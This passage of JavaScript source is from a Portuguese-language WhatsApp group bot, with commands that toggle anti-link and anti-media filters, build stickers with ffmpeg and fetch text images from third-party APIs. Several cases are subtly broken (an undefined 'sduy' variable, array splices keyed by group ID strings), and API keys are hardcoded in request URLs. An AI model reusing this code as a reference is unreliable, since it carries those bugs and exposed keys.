reply('‼️ Desativou com sucesso o recurso de antifake neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiloc':
if (!isGroup) return reply(` SOMENTE EM GRUPOS`)
if (!isGroupAdmins) return reply(`PRECISA SER ADMIN`)
if (!isBotGroupAdmins) return reply(` O BOT PRECISA SER ADMIN`)
try {														 
if (args.length < 1) return reply('1 pra ativar, 0 pra desligar')
if (Number(args[0]) === 1) {
if(Antiloc) return reply('Já está Ativo.')
antiloc.push(from)
fs.writeFileSync('./datab/ants/antiloc.json', JSON.stringify(antiloc))
reply('Ativou com sucesso o recurso de anti loc neste grupo✔️')
} else if (Number(args[0]) === 0) {
if(!Antiloc) return reply('Já está Desativado.')
antiloc.splice(from, 1)
fs.writeFileSync('./datab/ants/antiloc.json', JSON.stringify(antiloc))
reply('Desativou com sucesso o recurso de anti loc neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
} catch {
reply('Deu erro, tente novamente :/')
}
break

case 'antidocumento':
case 'antidoc':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (Antidoc) return reply('Ja esta ativo')
antidoc.push(from)
fs.writeFileSync('./datab/ants/antidoc.json', JSON.stringify(antidoc))
reply('🌀 Ativou com sucesso o recurso de anti documento neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!Antidoc) return reply('Ja esta Desativado')
pesquisar = from
processo = antidoc.indexOf(pesquisar)
while(processo >= 0){
antidoc.splice(processo, 1)
processo = antidoc.indexOf(pesquisar)
}
fs.writeFileSync('./datab/ants/antidoc.json', JSON.stringify(antidoc))
reply('‼️ Desativou com sucesso o recurso de anti documento neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiimg':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiImg) return reply('Já Esta ativo')
antiimg.push(from)
fs.writeFileSync('./datab/ants/antiimg.json', JSON.stringify(antiimg))
reply('Ativou com sucesso o recurso de anti imagem neste grupo✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiImg) return reply('Ja esta Desativado.')
antiimg.splice(from, 1)
fs.writeFileSync('./datab/ants/antiimg.json', JSON.stringify(antiimg))
reply('Desativou com sucesso o recurso de anti imagem neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antisticker':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiSticker) return reply('Já Esta ativo')
antisticker.push(from)
fs.writeFileSync('./datab/ants/antisticker.json', JSON.stringify(antisticker))
reply('Ativou com sucesso o recurso de anti sticker neste grupo✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiSticker) return reply('Ja esta Desativado.')
antisticker.splice(from, 1)
fs.writeFileSync('./datab/ants/antisticker.json', JSON.stringify(antisticker))
reply('Desativou com sucesso o recurso de anti sticker neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antinotas':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiNotas) return reply('Já Esta ativo')
antinotas.push(from)
fs.writeFileSync('./datab/ants/antinotas.json', JSON.stringify(antinotas))
reply('Ativou com sucesso o recurso de anti notas neste grupo✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiNotas) return reply('Ja esta Desativado.')
antinotas.splice(from, 1)
fs.writeFileSync('./datab/ants/antinotas.json', JSON.stringify(antinotas))
reply('Desativou com sucesso o recurso de anti notas neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antivideo':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiVid) return reply('Ja esta ativo')
antivid.push(from)
fs.writeFileSync('./datab/ants/antivideo.json', JSON.stringify(antivid))
reply('Ativou com sucesso o recurso de anti video neste grupo✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiVid) return reply('Ja esta Desativado')
antivid.splice(from, 1)
fs.writeFileSync('./datab/ants/antivideo.json', JSON.stringify(antivid))
reply('Desativou com sucesso o recurso de anti video neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiaudio':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiAudio) return reply('Ja esta ativo')
antiaudio.push(from)
fs.writeFileSync('./datab/ants/antiaudio.json', JSON.stringify(antiaudio))
reply('Ativou com sucesso o recurso de anti audio neste grupo✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiAudio) return reply('Ja esta Desativado')  
antiaudio.splice(from, 1)
fs.writeFileSync('./datab/ants/antiaudio.json', JSON.stringify(antiaudio))
reply('Desativou com sucesso o recurso de anti audio neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiflod':
case 'antiflood':  
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar. info.Badmin)
if (args.length < 1) return reply(`Digite ${prefix + command} 1 para ativar`)
if (Number(args[0]) === 1) {
if (isAntiFlood) return reply(`🌀 O recurso limite de caracteres até ${limitefl} já está ativo no grupo 🌀`)
antiflood.push(from)
fs.writeFileSync('./datab/usuarios/antiflood.json', JSON.stringify(antiflood))
reply(`✔️ O recurso limite de caracteres ${limitefl} foi ativado nesse grupo📝`)
} else if (Number(args[0]) === 0) {
 if (!isAntiFlood) return reply('✔️ O recurso limite de caracteres não está ativado no grupo 📝')
let position = false
Object.keys(antiflood).forEach((i) => {
if (antiflood[i] === from) {
position = i
}
})
if (position !== false) {
antiflood.splice(position, 1)
fs.writeFileSync('./datab/usuarios/antiflood.json', JSON.stringify(antiflood))
}
reply('O recurso limite de caracteres foi desativado nesse grupo ✔️')
} else {
reply(`Digite ${prefix + command} 1 para ativar, 0 para desativar o recurso`)
}
break

case 'resetarttt':
case 'rvttt':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
daily.splice([])
fs.writeFileSync('./datab/usuarios/diario.json', JSON.stringify(daily))
reply('‼️O jogo da velha TTT foi resetado com sucesso..✔️')
reply(`${prefix}reiniciar`)
break

case 'reiniciar':
if(!SoDono) return
rp = (Date.now() / 1000) - info.messageTimestamp
blar = process.uptime()
file = require.resolve(__filename)  
delete require.cache[file]
require(file)  
reply(`Reiniciei em ${String(rp.toFixed(3))}m\n\nTempo Ativo : ${kyun(blar)}`)
break

case 'antiporno':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAntiPorn) return reply('Ja esta ativo')
antiporn.push(from)
fs.writeFileSync('./datab/ants/antiporn.json', JSON.stringify(antiporn))
reply('🌀 Ativou com sucesso o recurso de antiporn neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isAntiPorn) return reply('Ja esta Desativado')
pesquisar = from
processo = antiporn.indexOf(pesquisar)
while(processo >= 0){
antiporn.splice(processo, 1)
processo = antiporn.indexOf(pesquisar)
}
fs.writeFileSync('./datab/ants/antiporn.json', JSON.stringify(antiporn))
reply('‼️ Desativou com sucesso o recurso de antiporn neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antipalavrão':
case 'antipalavrao':  
case 'antipalavra':    
if (!isGroup) return reply(`[❗] SOMENTE EM GRUPOS`)
if (!isGroupAdmins) return reply(`[❗] O PRECISA SER ADMIN`)
if (!isBotGroupAdmins) return reply(`[❗] O BOT PRECISA SER ADMIN`)
if (args.length < 1) return reply(`[❗] 1 / 0, Exemplo ${prefix + command} 1`)
if (Number(args[0]) === 1) {
if (isPalavrao) return reply('Ja esta ativo.')
palavrao.push(from)
fs.writeFileSync('./datab/grupos/palavrao.json', JSON.stringify(palavrao))
reply('🌀 Ativou com sucesso o recurso de Anti Palavras hardcore neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isPalavrao) return reply('Ja esta Desativado')
pesquisar = from
processo = palavrao.indexOf(pesquisar)
while(processo >= 0){
palavrao.splice(processo, 1)
processo = palavrao.indexOf(pesquisar)
}
fs.writeFileSync('./datab/grupos/palavrao.json', JSON.stringify(palavrao))
reply('‼️ Desativou com sucesso o recurso de Anti Palavra harcore neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break
case 'luixbot':
if(isSimi) return reply('Desativado')
text = args.join(" ")
data = await fetchJson(`https://api.simsimi.net/v2/?text=${sduy}&lc=pt`, {method: 'get'})
simi = `${data.success}`  
reply(simi)
break
case 'simih2':
if(!SoDono) return reply("Só dono pode executar esta ação...")
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isSimi2) return reply('O modo Simi está ativo')
samih2.push(from)
fs.writeFileSync('./armor/funcoes/simi.json', JSON.stringify(samih2))
reply('Ativado com sucesso o modo simi neste grupo 😗, Este simih2 ele aprende as respostas e perguntas das pessoas, conforme vai falando, por isso, só recomendo utilizar ele no termux, pois no site ou lugar diferente do termux que você utilizar, ele não vai armazenar os dados nescessarios')
} else if (Number(args[0]) === 0) {
if(!isSimi2) return reply('Já está Desativado.')
pesquisar = from
processo = samih2.indexOf(pesquisar)
while(  processo >= 0){
samih2.splice(processo, 1)
processo = samih2.indexOf(pesquisar)
}
fs.writeFileSync('./armor/funcoes/simi.json', JSON.stringify(samih2))
reply('Desativado modo simi com sucesso neste grupo 😡️')
} else {
reply('1 para ativar, 0 para desativar, lerdao vc em KKKKK')
}
break

case 'antilinkhard':
case 'antilink56':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAntiLinkHard) return reply('Ja esta ativo')
antilinkhard.push(from)
fs.writeFileSync('./datab/ants/antilinkhard.json', JSON.stringify(antilinkhard))
reply('🌀 Ativou com sucesso o recurso de antilink hardcore neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isAntiLinkHard) return reply('Ja esta Desativado')
pesquisar = from
processo = antilinkhard.indexOf(pesquisar)
while(processo >= 0){
antilinkhard.splice(processo, 1)
processo = antilinkhard.indexOf(pesquisar)
}
fs.writeFileSync('./datab/ants/antilinkhard.json', JSON.stringify(antilinkhard))
reply('‼️ Desativou com sucesso o recurso de antilink harcore neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'autofigu': case 'autosticker':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAutofigu) return reply('Ja esta ativo')
autofigu.push(from)
fs.writeFileSync('./datab/grupos/autofigu.json', JSON.stringify(autofigu))
reply('🌀 Ativou com sucesso o recurso de auto figurinhas neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isAutofigu) return reply('Ja esta Desativado')
pesquisar = from
processo = autofigu.indexOf(pesquisar)
while(processo >= 0){
autofigu.splice(processo, 1)
processo = autofigu.indexOf(pesquisar)
}
fs.writeFileSync('./datab/grupos/autofigu.json', JSON.stringify(autofigu))
reply('‼️ Desativou com sucesso o recurso de auto figurinhas neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antilinkgp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAntilinkgp) return reply('Ja esta ativo')
antilinkgp.push(from)
fs.writeFileSync('./datab/ants/antilinkgp.json', JSON.stringify(antilinkgp))
reply('🌀 Ativou com sucesso o recurso de antilinkgp 📝')
} else if (Number(args[0]) === 0) {
if (!isAntilinkgp) return reply('Ja esta Desativado')
pesquisar = from
processo = antilinkgp.indexOf(pesquisar)
while(processo >= 0){
antilinkgp.splice(processo, 1)
processo = antilinkgp.indexOf(pesquisar)
}
fs.writeFileSync('./datab/ants/antilinkgp.json', JSON.stringify(antilinkgp))
reply('‼️ Desativou com sucesso o recurso de antilink de grupo ✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'bemvindo2':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if(!SoDono) return reply("Comando Desativado temporariamente para teste...")
if (args.length < 1) return reply(`Digite da forma correta:\nComando: ${prefix + command} 1 para ativar `)
if (Number(args[0]) === 1) {
reply(`Devo Lembrar que você deve determinar a legenda desse grupo, após ativar essa função, a legenda funciona por grupo, se deseja saber mais informações sobre, digite ${prefix}infobemvindo`)  
if (isWelkom2) return reply('❎O recurso já está ativado no grupo❎')
welkom2.push(from)
fs.writeFileSync('./datab/usuarios/vacilo.json', JSON.stringify(welkom2))
reply('✅O recurso foi ativado✅')
} else if (Number(args[0]) === 0) {
if (!isWelkom2) return reply('❎O recurso não está ativado no grupo❎')
let position = false
Object.keys(welkom2).forEach((i) => {
if (welkom2[i] === from) {
position = i
}
})
if (position !== false) {
welkom2.splice(position, 1)
fs.writeFileSync('./datab/usuarios/vacilo.json', JSON.stringify(welkom2))
}
reply('❌O recurso foi desativado❌')
} else {
reply(`Digite da forma correta:\nComando: ${prefix + command} 1, para ativar e 0 para desativar`)
}
break

//==========(Sticker-Stickers)===========\\

case 'emoji':
case 'semoji':
if(!q) return reply(`Exemplo: ${prefix}emoji ☹️/whatsapp,\niplone,\ngoogle,\nsamsung,\nmicrosoft,\nwhatsapp,\ntwitter,\nfacebook,\nemojidex,\nopenmoji,\nlg,\nhtc`)
emot = q.split('/')[0]
jemot = q.split('/')[1]
if(jemot == 'iplone'){
idemot = 0
}
else if(jemot == 'google'){
idemot = 1
}
else if(jemot == 'samsung'){
idemot = 2
}
else if(jemot == 'microsoft'){
idemot = 3
}
else if(jemot == 'whatsapp'){
idemot = 4
}
else if(jemot == 'twitter'){
idemot = 5
}
else if(jemot == 'facebook'){
idemot = 6
}
else if(jemot == 'joypixels'){
idemot = 7
}
else if(jemot == 'openmoji'){
idemot = 8
}
else if(jemot == 'emojidex'){
idemot = 9
}
else if(jemot == 'lg'){
idemot = 10
}
else if(jemot == 'htc'){
idemot = 11
}
else if(!jemot){
idemot = 4
}
else{
return reply(`Exemplo: ${prefix}emoji ☹️/whatsapp`)
}
reply(enviar.espere)
if(idemot == undefined) return
emoji.get(emot)
.then(emoji => {
console.log(emoji.images[idemot]);
sendStickerFromUrl(from, emoji.images[idemot].url, info)
}).catch(e => {
reply("EMOJI NÃO ENCONTRADO, TENTE OUTRO EMOJI..")
})
break

case 'emoji-mix':
case 'emojimix':
txt = q.replace(" +", "+").replace("+ ", "+").replace(" + ", "+")
var [emj1, emj2] = txt.split("+")
if(!q.includes("+")) return reply(`Olá, está faltando o +\nExemplo: ${prefix+command} 😪+🤣`)
try {
reply(enviar.espere)
sendStickerFromUrl(from, `http://apis.bronxyshost.com/api-bronxys/emojimix?emoj=${encodeURI(emj1)}&emoj2=${encodeURI(emj2)}&apikey=@Luix1397`)
} catch (e) {
if(String(e).includes(Luix1397)) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('*Ops não foi possivel fazer esse mix de emoji / Ou ocorreu algum problema no sistema..*')
}
}
break

case 'figfundo':
case 'figvideo':
case 'figusemfundo': 
case 'sfundo':  
if ((isMedia && !info.message.videoMessage || isQuotedImage) && args.length == 0) {
rafa = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
reply(enviar.espere)
buff = await getFileBuffer(rafa, 'image')
bas64 = `data:image/jpeg;base64,${buff.toString('base64')}`
anu = args.join(' ').split('|')
satu = anu[0] !== '' ? anu[0] : `${pushname}`
sd = `📍Criado por↓        ${NomeDoBot}`
dua = typeof anu[1] !== 'undefined' ? anu[1] : `${sd}`
var mantap = await convertSticker(bas64, `${dua}`, `${satu}`)
var sti = new Buffer.from(mantap, 'base64');
conn.sendMessage(from, {sticker: sti}, {quoted: info})
} else {
return reply(`So imagem mn -_-`)
}
break

case 'rename':
case 'roubar':  
if (!isQuotedSticker) return reply('Marque uma figurinha...')
encmediats = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
var kls = q
var pack = kls.split("/")[0];
var author2 = kls.split("/")[1];
if (!q) return reply('*E o autor e o nome do pacote?*')
if (!pack) return reply(`*por favor escreve o formato certo: ${prefix + command} sad/bla*`)
if (!author2) return reply(`*por favor escreve o formato certo: ${prefix + command} sad/dms*`)
reply(enviar.espere)
bas64 = `data:image/jpeg;base64,${encmediats.toString('base64')}`
var mantap = await convertSticker(bas64, `${author2}`, `${pack}`)
var sti = new Buffer.from(mantap, 'base64');
conn.sendMessage(from, {sticker: sti, contextInfo: { externalAdReply:{title: `${pack}|${author2}`,body:"", previewType:"PHOTO",thumbnail: sti}}}, {quoted: info})
.catch((err) => {
reply(`❎ Error, tenta mais tarde`); 
})
break

case 'fstiker': 
case 'fsticker':
case 'f':
async function stickerffc() {
await setTimeout(async () => {
if ((isMedia && !info.message.videoMessage || isQuotedImage) && args.length == 0) {
var encmedia = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'image')
fs.writeFileSync(rane, buffimg)
const media = rane
ran = getRandom('.webp')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(enviar.stikga)
})
.on('end', function () {
console.log('Finish')
buffer = fs.readFileSync(ran)
conn.sendMessage(from, {sticker: buffer}, {quoted: info})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && info.message.videoMessage.seconds < 10 || isQuotedVideo && info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 10) && args.length == 0) {
var encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
const media = rane
ran = getRandom('.webp')
reply(enviar.espere) 
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(enviar.stikga)
})
.on('end', function () {
console.log('Finish')
buffer = fs.readFileSync(ran)
conn.sendMessage(from, {sticker: buffer}, {quoted: info})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else {
reply(`Enviar imagem / vídeo / gif com legenda \n${prefix}sticker (duração do adesivo de vídeo de 1 a 9 segundos)`)
}
}, 1000)
}
stickerffc().catch(e => {
console.log(e)
reply("ERROR")
})
break 
case 'recrutar': case 'convidar':
if(!isGroupAdmins && !isPremium) return reply("Somente adm ou usuários premium tem direito de utilizar esse comando!")
if(!isBotGroupAdmins) return reply(enviar.msg.Badmin)
txt = args.join(" ")
let [result] = await conn.onWhatsApp(txt)
if(!result) return reply(`Número inválido!`)
bla = `Clique no símbolo acima da imagem para entrar no meu grupo...`
linkgc = await conn.groupInviteCode(from)
conn.sendMessage(result.jid, {image:{url: logo}, mimetype: "image/jpeg", caption: "Clique no símbolo a cima da imagem para entrar no grupo...", contextInfo: { externalAdReply: {title:"Ꜥꜥ🧺᳝゛𝐂𝐋𝐈𝐐𝐔𝐄 𝐀𝐐𝐔𝐈! ♡", body: "", reviewType: "PHOTO",  thumbnailUrl: logo, sourceUrl: `https://chat.whatsapp.com/`+linkgc, mediaType: 2 }}}, {quoted: info})
reply("Convite do nosso grupo foi enviado para o privado dele(a) com sucesso!")
break

case 'st':
case 'figurinha':
case 'sticker':
case 's':
async function stickerfc() {
await setTimeout(async () => {
if ((isMedia && !info.message.videoMessage || isQuotedImage) && args.length == 0) {
var encmedia = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'image')
fs.writeFileSync(rane, buffimg)
const media = rane
rano = getRandom('.webp')
reply(enviar.espere)
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
conn.sendMessage(from, {sticker: buffer}, {quoted: info})
fs.unlinkSync(rano)
})
} else if ((isMedia && info.message.videoMessage.seconds < 11 || isQuotedVideo && info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 10) && args.length == 0) {
var encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
const media = rane
rano = getRandom('.webp')
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('bot', 'ale')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Falha na conversão de ${tipe} para sticker`)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
conn.sendMessage(from, {sticker: buffer}, {quoted: info})
fs.unlinkSync(rano)
})
} else {
reply(`Você precisa enviar ou marcar uma imagem ou vídeo com no máximo 10 segundos`)
}
}, 1000)
}
stickerfc().catch(e => {
console.log(e)
reply("ERROR")
})
break


case 'tourl': {
		        let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./armor/tourl.js')
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
case 'toimg':
if (!isQuotedSticker) return reply('❌ adesivo de resposta um ❌')
reply(enviar.espere)
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
conn.sendMessage(from, {image: buff}, {quoted: info}).catch(e => {
console.log(e);
reply('ERROR!!')
})
break

//=============(LOGOS)=============\\

case 'mascoteavatar':  
try {
textin = args.join(" ")
txt1 = textin.split("/")[0];
txt2 = textin.split("/")[1];
if(!textin) return reply("Cade o texto?")
if(!textin.includes("/")) return reply(`Cade a / precisa dela para a separação..\nExemplo: ${prefix + command} Game/Play`)
reply(enviar.espere)
bla = await fetchJson(`https://apis.nezsab-apis.xyz/api/mascoteavatar?texto=${txt1}&texto2=${txt2}&apikey=apikey_LuixxLindo-2023`)
blabla = await getBuffer(bla.resultado.imageUrl)
conn.sendMessage(from, {image: blabla}, {quoted: m}).catch(rs =>{
reply("ERROR!!")  
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

//==========(PLAQUINHAS-LOGOS)===========\

case 'placaloli':
if (!q) return reply(enviar.wrongFormat)
reply('Aguarde..')
lod = await fetchJson(`https://nekobot.xyz/api/imagegen?type=kannagen&text=${q}`)
sendStickerFromUrl(from, lod.message, enviar.success)
await limitAdd(sender)
break 
case 'plaquinha':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(11)
					if (teks.length > 12) return reply('O texto é longo, até 10> caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images%20(1)%20(6).jpeg?text.0.text=${teks}&text.0.position.x=-17%25&text.0.position.y=-20%25&text.0.size=41&text.0.color=000000&text.0.opacity=59&text.0.font.family=PT%20Mono&text.0.outline.blur=10" width="463" height="662" alt="" />`,`https://lerrewor.sirv.com/Teste/images%20(1)%20(12).jpeg?text.0.text=${teks}&text.0.position.x=-20%25&text.0.position.y=-35%25&text.0.size=41&text.0.color=000000&text.0.font.family=Playball&text.0.background.opacity=16&text.0.outline.color=ff0000&text.0.outline.blur=24" width="225" height="225" alt="" />`)
                   conn.sendMessage(from, {image: buffer}, {quoted: selo}),
                   reply('plaquinha enviada..')
					break
case 'plaquinha2':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(11)
					if (teks.length > 12) return reply('O texto é longo, até 10> caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images%20(1)%20(5).jpeg?text.0.text=${teks}&text.0.position.x=-45%25&text.0.position.y=-29%25&text.0.size=36&text.0.color=000000&text.0.opacity=65&text.0.font.family=PT%20Sans%20Narrow" width="479" height="640" alt="" />`)
                   conn.sendMessage(from, {image: buffer}, {quoted: selo}),
                   reply('plaquinha enviada no seu pv')
					break
case 'plaquinha3':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(11)
					if (teks.length > 12) return reply('O texto é longo, até 10> caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images%20(1)%20(10).jpeg?text.0.text=${teks}&text.0.position.y=-25%25&text.0.size=41&text.0.color=000000&text.0.font.family=Vollkorn&text.0.background.opacity=100" width="193" height="261" alt="" />`)
                   conn.sendMessage(from, {image: buffer}, {quoted: selo}),
                   reply('plaquinha enviada no seu pv')
					break
case 'plaquinha4':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(11)
					if (teks.length > 12) return reply('O texto é longo, até 10> caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images%20(1)%20(9).jpeg?text.0.text=${teks}&text.0.position.x=-49%25&text.0.position.y=-19%25&text.0.size=45&text.0.color=000000&text.0.opacity=97&text.0.font.family=Patrick%20Hand" width="250" height="333" alt="" />`)
                   conn.sendMessage(from, {image: buffer}, {quoted: selo}),
                   reply('plaquinha enviada no seu pv')
					break
case 'plaquinha5':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(11)
					if (teks.length > 12) return reply('O texto é longo, até 10> caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images%20(1)%20(8).jpeg?text.0.text=${teks}&text.0.position.x=-28%25&text.0.position.y=-41%25&text.0.size=41&text.0.color=000000&text.0.opacity=99&text.0.font.family=Signika" width="225" height="225" alt="" />`)
                   conn.sendMessage(from, {image: buffer}, {quoted: selo}),
                   reply('plaquinha enviada no seu pv')
					break 
case 'plaquinha6':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(11)
					if (teks.length > 12) return reply('O texto é longo, até 10> caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images%20(1)%20(7).jpeg?text.0.text=${teks}&text.0.position.x=-13%25&text.0.position.y=-25%25&text.0.size=35&text.0.color=000000&text.0.opacity=57&text.0.background.opacity=98&text.0.outline.opacity=16" width="420" height="729" alt="" />`)
